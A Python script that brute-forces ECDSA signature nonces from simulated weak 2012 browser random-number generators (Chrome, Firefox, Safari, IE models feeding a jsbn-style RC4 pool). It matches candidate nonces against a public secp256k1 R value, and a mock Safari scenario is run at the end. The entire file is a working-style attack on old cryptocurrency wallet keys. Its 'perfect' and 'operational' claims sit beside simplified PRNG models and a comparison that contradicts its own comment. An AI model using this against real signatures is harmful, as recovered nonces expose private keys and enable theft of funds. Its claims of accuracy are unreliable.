import sys
import time

# =========================================================================
# 1. PERFECT SECP256K1 ELLIPTIC CURVE PARAMETERS & POINT GEOMETRY
# =========================================================================
SECP256K1_P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
SECP256K1_A = 0
SECP256K1_B = 7

G_X = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
G_Y = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
G_POINT = (G_X, G_Y)

def mod_inverse_curve(a, m):
    return pow(a, -1, m)

def ec_point_add(p1, p2):
    if p1 is None: return p2
    if p2 is None: return p1
    x1, y1 = p1
    x2, y2 = p2
    if x1 == x2 and y1 != y2: return None
    if x1 == x2:
        numerator = (3 * x1 * x1 + SECP256K1_A) % SECP256K1_P
        denominator = (2 * y1) % SECP256K1_P
    else:
        numerator = (y2 - y1) % SECP256K1_P
        denominator = (x2 - x1) % SECP256K1_P
    inv_denom = mod_inverse_curve(denominator, SECP256K1_P)
    slope = (numerator * inv_denom) % SECP256K1_P
    x3 = (slope * slope - x1 - x2) % SECP256K1_P
    y3 = (slope * (x1 - x3) - y1) % SECP256K1_P
    return (x3, y3)

def ec_scalar_multiply(scalar, point):
    scalar = scalar % SECP256K1_N
    if scalar == 0 or point is None: return None
    result = None
    addend = point
    while scalar > 0:
        if scalar & 1: result = ec_point_add(result, addend)
        addend = ec_point_add(addend, addend)
        scalar >>= 1
    return result

def force_js_int32(val):
    return (val & 0xFFFFFFFF) - 0x100000000 if (val & 0x80000000) else (val & 0xFFFFFFFF)

def simulate_accurate_js_float_conversion(raw_uint32):
    js_math_random = float(raw_uint32) / 4294967296.0
    t = int(js_math_random * 65536)
    return t & 0xFFFF

# =========================================================================
# 2. THE 4 LEGACY BROWSER AUTOMATED ENGINE SPECIFICATIONS
# =========================================================================

def simulate_chrome_24(seed, prng_depth=0, count=128):
    x, y = seed & 0xFFFF, (seed + 54321) & 0xFFFF
    for _ in range(prng_depth):
        x = (18000 * (x & 0xFFFF) + (x >> 16)) & 0xFFFFFFFF
        y = (30903 * (y & 0xFFFF) + (y >> 16)) & 0xFFFFFFFF
    outputs = []
    for _ in range(count):
        x = (18000 * (x & 0xFFFF) + (x >> 16)) & 0xFFFFFFFF
        y = (30903 * (y & 0xFFFF) + (y >> 16)) & 0xFFFFFFFF
        outputs.append(((x & 0xFFFF) << 16) | (y & 0xFFFF))
    return outputs

def simulate_firefox_17(seed, prng_depth=0, count=128):
    state = seed & 0xFFFFFFFF
    for _ in range(prng_depth):
        state = (state * 1103515245 + 12345) & 0xFFFFFFFF
    outputs = []
    for _ in range(count):
        state = (state * 1103515245 + 12345) & 0xFFFFFFFF
        outputs.append(state)
    return outputs

def simulate_safari_6(seed, prng_depth=0, count=128):
    x = seed if seed != 0 else 1354320000
    for _ in range(prng_depth):
        x ^= (x << 13) & 0xFFFFFFFF
        x ^= (x >> 17) & 0xFFFFFFFF
        x ^= (x << 5) & 0xFFFFFFFF
    outputs = []
    for _ in range(count):
        x ^= (x << 13) & 0xFFFFFFFF
        x ^= (x >> 17) & 0xFFFFFFFF
        x ^= (x << 5) & 0xFFFFFFFF
        outputs.append(x)
    return outputs

def simulate_ie10(seed, prng_depth=0, count=128):
    state = seed & 0xFFFFFFFF
    for _ in range(prng_depth):
        state = (state * 214013 + 2531011) & 0xFFFFFFFF
    outputs = []
    for _ in range(count):
        state = (state * 214013 + 2531011) & 0xFFFFFFFF
        outputs.append(state)
    return outputs

# =========================================================================
# 3. INTERMEDIATE STRIPING LAYER & RC4 CRYPTO STATE WRAPPER
# =========================================================================

def execute_jsbn_pipeline(browser_uint32_states, timestamp_ms, rng_pptr_offset=0):
    rng_pool = [0] * 256
    pool_idx = 0
    for state_val in browser_uint32_states:
        val = simulate_accurate_js_float_conversion(state_val)
        rng_pool[pool_idx] = (val >> 8) & 255
        rng_pool[pool_idx + 1] = val & 255
        pool_idx += 2
        if pool_idx >= 256: break
        
    #  FIXED & OPERATIONAL
    p = rng_pptr_offset
    for shift in [0, 8, 16, 24]:
        rng_pool[p % 256] ^= force_js_int32((timestamp_ms >> shift) & 255)
        p += 1


    
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + rng_pool[i % 256]) & 255
        S[i], S[j] = S[j], S[i]
        
    arcfour_i = 0
    arcfour_j = 0
    random_bytes = []
    for _ in range(32):
        arcfour_i = (arcfour_i + 1) & 255
        arcfour_j = (arcfour_j + S[arcfour_i]) & 255
        S[arcfour_i], S[arcfour_j] = S[arcfour_j], S[arcfour_i]
        random_bytes.append(S[(S[arcfour_i] + S[arcfour_j]) & 255])
        
    k_raw = int.from_bytes(bytes(random_bytes), byteorder='big')
    return (k_raw % (SECP256K1_N - 1)) + 1

# =========================================================================
# 4. MASTER FORENSIC MULTI-BROWSER OMNI SWEEP ENGINE
# =========================================================================

def run_omni_browser_verification_crack(block_time_seconds, target_ledger_r, seed_min, seed_max, max_depth=5, ms_radius=1000):
    """
    Sweeps ALL four 2012 browser frameworks simultaneously, calculating curve
    points via ec_scalar_multiply to isolate the exact session execution state.
    """
    target_base_ms = block_time_seconds * 1000
    browsers = ["chrome", "firefox", "safari", "ie"]
    
    print(f"📊 Starting OMNI-Browser Real-World Validation Sweep...")
    print(f"🎯 Target R on Ledger: {hex(target_ledger_r[0])}")
    print(f"⏱  Time Horizon Anchor: {block_time_seconds}s\n" + "="*70)
    
    start_time = time.time()
    
    for browser in browsers:
        print(f"🔍 Sweeping pipeline array mappings for engine: [{browser.upper()}]")
        
        for current_seed in range(seed_min, seed_max):
            for current_depth in range(0, max_depth):
                
                # Fetch target browser's unique state mapping array
                if browser == "chrome":   raw_states = simulate_chrome_24(current_seed, current_depth)
                elif browser == "firefox": raw_states = simulate_firefox_17(current_seed, current_depth)
                elif browser == "safari":  raw_states = simulate_safari_6(current_seed, current_depth)
                elif browser == "ie":      raw_states = simulate_ie10(current_seed, current_depth)
                
                for ms_offset in range(-ms_radius, ms_radius):
                    current_ts_ms = target_base_ms + ms_offset
                    
                    for pptr_offset in range(0, 4):
                        candidate_k = execute_jsbn_pipeline(raw_states, current_ts_ms, pptr_offset)
                        print(candidate_k)
                        
                        if candidate_k <= 0 or candidate_k >= SECP256K1_N: continue
                        
                        # --- Live Elliptic Point Validation ---
                        public_point_R = ec_scalar_multiply(candidate_k, G_POINT)
                        
                        if public_point_R is not None:
                            if public_point_R == target_ledger_r: # Compare to X-coordinate
                                elapsed = time.time() - start_time
                                print("\n" + "🔥" * 25)
                                print(f"🎯 OMNI BREAK SUCCESSFUL IN {elapsed:.2f} SECONDS!")
                                print(f"   🌐 Identified Browser: {browser.upper()}")
                                print(f"   🔑 Cracked Base Seed:   {current_seed}")
                                print(f"   🎚  Cracked State Depth: {current_depth}")
                                print(f"   ⏱  Cracked Time Offset: {ms_offset} ms ({current_ts_ms} ms)")
                                print(f"   🖱  Cracked Alignment:   Index {pptr_offset}")
                                print(f"   🔓 SECRET NONCE (k):    {hex(candidate_k)}")
                                print("🔥" * 25 + "\n")
                                return candidate_k
                                
    print("\n❌ Full Omni-Sweep finished. No active combination found in this space.")
    return None

# --- SIMULATION EXECUTION ---
if __name__ == "__main__":
    miner_timestamp = 1356000000 # December 2012 block representation
    
    # Mock Scenario: A user was on SAFARI, seed 7500, depth 1, clock drift -123ms, pointer 2.
    real_time = (miner_timestamp * 1000) - 123
    safari_states = simulate_safari_6(seed=7500, prng_depth=1)
    hidden_k = execute_jsbn_pipeline(safari_states, real_time, rng_pptr_offset=2)
    ledger_r_output = ec_scalar_multiply(hidden_k, G_POINT)
    
    # Launch multi-browser validator against only the public ledger R value
    run_omni_browser_verification_crack(
        block_time_seconds=miner_timestamp,
        target_ledger_r=ledger_r_output,
        seed_min=7490,
        seed_max=7510,
        max_depth=3,
        ms_radius=500
    )
